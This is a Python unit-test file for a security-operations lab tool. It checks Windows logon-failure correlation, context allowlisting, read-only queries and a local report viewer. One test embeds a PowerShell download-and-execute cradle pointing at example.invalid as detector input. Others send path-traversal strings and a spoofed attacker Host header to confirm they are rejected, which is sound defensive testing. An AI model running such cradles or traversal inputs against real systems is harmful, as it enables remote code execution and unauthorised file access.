"""Boundary tests for authentication leads, context tuning, SQL and the local viewer."""

import copy
import json
from pathlib import Path
import tempfile
import threading
from http.server import ThreadingHTTPServer
import unittest
from urllib.request import urlopen, Request
from urllib.error import HTTPError

from soclab.context import annotate, load_context
from soclab.correlation import credential_leads
from soclab.detections import detect, load_rules
from soclab.events import normalize_event
from soclab.query import run_query
from soclab.report import analyze
from soclab.store import ingest
from soclab.webapp import build_handler

ROOT = Path(__file__).resolve().parents[1]
RULES = ROOT / "rules/windows.json"


class ExtendedTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.base = json.loads((ROOT / "data/fixtures/demo.jsonl").read_text(encoding="utf-8").splitlines()[0])

    def events(self, count, eid=4625, step=1, digest="a" * 64):
        result = []
        from datetime import datetime, timedelta, timezone
        for i in range(count):
            e = copy.deepcopy(self.base)
            e["timestamp"] = (datetime(2026, 9, 1, 9, tzinfo=timezone.utc) + timedelta(seconds=i*step)).isoformat()
            e["event_id"] = eid
            if eid == 4648:
                e["event_data"].update(SubjectUserSid="S-1-5-21-1000", SubjectUserName="lab", TargetServerName="LAB-SERVER", TargetUserName=f"user{i}")
            result.append(normalize_event(e, digest, i+1))
        return result

    def test_failure_burst_fires_without_success_and_cooldown_limits_flood(self):
        alerts = list(credential_leads(self.events(100)))
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0]["rule_id"], "AUTH-002")
        self.assertEqual(len(alerts[0]["evidence"]), 10)

    def test_failure_burst_needs_threshold_and_a_network_logon(self):
        self.assertEqual(list(credential_leads(self.events(9))), [])
        events = self.events(10)
        for event in events: event["event_data"]["LogonType"] = "2"
        self.assertEqual(list(credential_leads(events)), [])

    def test_failure_burst_window_excludes_old_attempts(self):
        self.assertEqual(list(credential_leads(self.events(10, step=60))), [])

    def test_failure_burst_does_not_combine_files(self):
        events = self.events(5) + self.events(5, digest="b"*64)
        self.assertEqual(list(credential_leads(events)), [])

    def test_failure_burst_keeps_domain_and_ip_separate(self):
        for field in ("TargetDomainName", "IpAddress"):
            events = self.events(10)
            events[-1]["event_data"][field] = "another"
            self.assertEqual(list(credential_leads(events)), [])

    def test_explicit_credentials_requires_distinct_accounts(self):
        events = self.events(20, eid=4648)
        for event in events: event["event_data"]["TargetUserName"] = "one-account"
        self.assertEqual(list(credential_leads(events)), [])
        self.assertEqual(list(credential_leads(self.events(10, eid=4648)))[0]["rule_id"], "AUTH-003")

    def test_explicit_credentials_does_not_combine_subject_or_target_server(self):
        for field in ("SubjectUserSid", "SubjectUserName", "TargetServerName"):
            events = self.events(10, eid=4648)
            events[-1]["event_data"][field] = "different"
            self.assertEqual(list(credential_leads(events)), [])

    def test_explicit_credentials_case_variants_are_one_account(self):
        events = self.events(10, eid=4648)
        events[-1]["event_data"]["TargetUserName"] = "USER0"
        self.assertEqual(list(credential_leads(events)), [])

    def test_context_keeps_findings_and_changes_only_exact_match(self):
        db = self.root / "events.sqlite"
        ingest(ROOT / "data/fixtures/context-tuning.jsonl", db)
        before = analyze(db, RULES, self.root / "before")
        after = analyze(db, RULES, self.root / "after", context_path=ROOT / "rules/context-lab.json")
        self.assertEqual(before["finding_count"], 4)
        self.assertEqual(after["finding_count"], 4)
        self.assertEqual(after["findings_by_status"], {"context_allowlisted": 1, "needs_review": 3})
        self.assertIsNotNone(after["context_sha256"])

    def test_each_context_field_blocks_a_changed_match(self):
        context = load_context(ROOT / "rules/context-lab.json")
        event = json.loads((ROOT / "data/fixtures/context-tuning.jsonl").read_text().splitlines()[0])
        rules = load_rules(RULES)
        for field in context[0]["equals"]:
            changed = copy.deepcopy(event)
            if field == "host": changed["host"] = "different"
            else: changed["event_data"][field.split(".",1)[1]] += "-different"
            # Altering Image can prevent the initial detection; otherwise it remains unallowlisted.
            alerts = list(detect([normalize_event(changed,"a"*64,1)],rules))
            for alert in alerts: self.assertEqual(annotate(alert,context)["status"], "needs_review")

    def test_context_rejects_broad_user_only_exception(self):
        path = self.root / "bad.json"
        path.write_text(json.dumps([{"id":"x","rule_id":"WIN-002","reason":"test","change_reference":"test","equals":{"event_data.User":"LAB\\backup.svc"}}]))
        with self.assertRaises(ValueError): load_context(path)

    def test_quoted_and_executable_text_both_need_analyst_review(self):
        fixture = json.loads((ROOT / "data/fixtures/demo.jsonl").read_text().splitlines()[8])
        for text in ("IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/lab')", '"IEX (New-Object Net.WebClient).DownloadString(\'https://example.invalid/lab\')"'):
            fixture["event_data"]["ScriptBlockText"] = text
            alerts = list(detect([normalize_event(fixture,"a"*64,1)],load_rules(RULES)))
            self.assertEqual(alerts[0]["rule_id"], "WIN-009")
            self.assertEqual(alerts[0]["status"], "needs_review")

    def test_query_rejects_arbitrary_name_and_keeps_db_read_only(self):
        db = self.root / "evidence.sqlite"
        ingest(ROOT / "data/fixtures/demo.jsonl", db)
        before = db.read_bytes()
        self.assertEqual(len(run_query(db,"mshta_remote")),1)
        self.assertEqual(len(run_query(db,"powershell_content")),1)
        self.assertEqual(db.read_bytes(),before)
        with self.assertRaises(ValueError):run_query(db,"../../delete")

    def test_failed_analysis_leaves_no_partial_final_bundle(self):
        db = self.root / "evidence.sqlite"
        ingest(ROOT / "data/fixtures/demo.jsonl", db)
        with self.assertRaises(ValueError): analyze(db,RULES,self.root/"incomplete",credential_threshold=1)
        self.assertFalse((self.root/"incomplete").exists())
        self.assertEqual(list(self.root.glob(".soclab-build-*")),[])

    def test_local_viewer_serves_real_counts_and_rejects_bad_hosts_or_paths(self):
        db = self.root / "evidence.sqlite"
        ingest(ROOT / "data/fixtures/demo.jsonl", db)
        out = self.root / "analysis"
        analyze(db,RULES,out)
        report = self.root / "report.md"
        report.write_text("Test report")
        index = self.root / "index.json"
        index.write_text(json.dumps({"run_id":"test","note":"test","cases":[{"id":"test","title":"Test","kind":"Synthetic","verdict":"Unassessed","report":str(report),"db":str(db),"analysis":str(out)}]}))
        server = ThreadingHTTPServer(("127.0.0.1",0),build_handler(index))
        thread = threading.Thread(target=server.serve_forever,daemon=True)
        thread.start()
        try:
            base=f"http://127.0.0.1:{server.server_address[1]}"
            with urlopen(base+"/api/cases") as response:
                result=json.load(response)
            self.assertEqual(result["cases"][0]["manifest"]["event_count"],19)
            with urlopen(base+"/api/events?case=test&event_id=4104") as response:self.assertEqual(len(json.load(response)),1)
            with self.assertRaises(HTTPError) as caught:urlopen(Request(base+"/api/cases",headers={"Host":"attacker.invalid"}))
            self.assertEqual(caught.exception.code,403)
            with self.assertRaises(HTTPError):urlopen(base+"/../../.git/config")
            with self.assertRaises(HTTPError):urlopen(base+"/api/events?case=test&limit=999999")
        finally:
            server.shutdown();server.server_close();thread.join()


if __name__ == "__main__": unittest.main()
